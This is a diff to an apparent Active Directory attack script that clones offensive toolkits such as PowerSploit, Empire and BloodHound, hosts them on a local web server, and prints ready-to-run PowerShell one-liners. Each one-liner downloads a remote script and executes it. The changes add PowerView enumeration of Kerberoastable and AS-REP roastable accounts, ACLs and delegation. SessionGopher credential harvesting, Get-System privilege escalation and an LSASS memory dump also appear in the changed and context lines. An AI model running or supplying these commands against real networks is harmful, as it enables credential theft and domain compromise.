@@ -33,6 +33,7 @@ GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-Sy
 SecListsRepo="https://github.com/danielmiessler/SecLists/";
 JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
 BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/";
+PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/";
 
 LocalRepo="False"
 
@@ -101,6 +102,7 @@ WinPwnLocalRepo="$HOME/ADAT/WinPwn"
 JAWSLocalRepo="$HOME/ADAT/JAWS"
 GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
 BloodHoundLocalRepo="$HOME/ADAT/BloodHound"
+PowersploitLocalRepo="$HOME/ADAT/Powersploit"
 
 
 if [ -d "$EmpireLocalRepo" ] 
@@ -204,6 +206,20 @@ else
 	echo -e ""
 fi
 
+if [ -d "$PowersploitLocalRepo" ] 
+then
+	echo -e ""
+    	echo -e "Powersploit is installed, checking if updated to latest version."
+    	cd $PowersploitLocalRepo
+    	git pull "https://github.com/PowerShellMafia/PowerSploit.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning Powersploit Repo${RESTORE}"
+	git clone --recursive "https://github.com/PowerShellMafia/PowerSploit.git" $HOME/ADAT/Powersploit
+	echo -e ""
+fi
+
 cp -r $HOME/ADAT/Empire/empire/server/data/module_source/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
@@ -211,6 +227,7 @@ cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/Get-System-Techniques/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/BloodHound/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/Powersploit/* $HOME/ADAT/LocalRepo
 
 python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &
 
@@ -284,6 +301,7 @@ while [ $# -gt 0 ]; do
 		JAWSRepo="http://$LocalIP:$LocalPort/"
 		GetSystemTechniquesRepo="http://$LocalIP:$LocalPort/"
 		BloodHoundRepo="http://$LocalIP:$LocalPort/"
+		PowersploitRepo="http://$LocalIP:$LocalPort/"
 		LocalRepo="True"
 		Function_LocalRepo;
                 shift
@@ -720,7 +738,8 @@ echo -e ""
 echo -e "${LGREEN}Unsecured Credentials${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Credentials in Files${RESTORE}"
-echo -e "$DownloadMethod $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher"
+echo -e "$DownloadMethod $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher -Thorough"
+echo -e "$DownloadMethod $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher -AllDomain -Thorough"
 echo -e ""
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 # Steal or Forge Kerberos Tickets
@@ -763,7 +782,8 @@ echo -e ""
 echo -e "${IBLUE}Get-System${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-System.ps1);Get-System"
 echo -e ""
-
+echo -e ""
+echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e "										${LGREEN} Enumeration ${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
@@ -797,7 +817,38 @@ echo -e ""
 echo -e "${IBLUE}Invoke-Bloodhound${RESTORE}"
 echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
 echo -e ""
-
+echo -e ""
+echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e "									${LGREEN} Enumeration (Powerview) ${RESTORE}"
+echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+# Powerview
+echo -e "${LGREEN}User Enumeration${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}User Properties${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties Name,Description,pwdlastset,badpwdcount | Sort Name"
+echo -e ""
+echo -e "${IBLUE}Kerberoastable Users${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | select name,serviceprincipalname"
+echo -e ""
+echo -e "${IBLUE}AS-REP Roastable Users${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -PreauthNotRequired | select name"
+echo -e ""
+echo -e "${LGREEN}ACLs${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Invoke-ACLScanner${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ACLScanner -ResolveGUIDs | Out-file 'ACL.txt' -Encoding ASCII "
+echo -e ""
+echo -e "${IBLUE}Delegation (Constrained)${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -TrustedToAuth"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -TrustedToAuth"
+echo -e ""
+echo -e "${IBLUE}Delegation (Unconstrained)${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -Unconstrained | select -ExpandProperty name"
+echo -e ""
+echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e "										${LGREEN} Collection ${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
@@ -813,9 +864,8 @@ echo -e ""
 echo -e "${IBLUE}Out-Minidump${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"collection/Out-Minidump.ps1);Get-Process lsass | Out-Minidump"
 echo -e ""
-echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e ""
-
+echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e "										${LGREEN} Token Impersonation ${RESTORE}"
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
